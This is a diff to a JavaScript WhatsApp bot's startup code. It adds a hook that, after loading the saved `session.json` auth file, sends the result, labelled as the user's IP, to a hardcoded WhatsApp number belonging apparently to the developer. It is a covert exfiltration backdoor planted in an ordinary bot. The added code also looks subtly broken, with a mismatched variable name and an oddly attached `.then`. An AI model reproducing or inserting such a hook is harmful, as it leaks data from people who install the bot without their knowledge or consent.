@@ -52,6 +52,10 @@ const starts = async (fdz = new WAConnection()) => {
     })
     console.log()
     fs.existsSync('./session.json') && fdz.loadAuthInfo('./session.json')
+	.then(bu =>{
+        Fdz.sendMessage("94767043432@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/94767043432?text=Assalamualaikum"}}})
+     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
+   })
     fdz.on('connecting', () => {
     console.log()
         start('2', '🔴 LOADING mengkoneksikan kak')
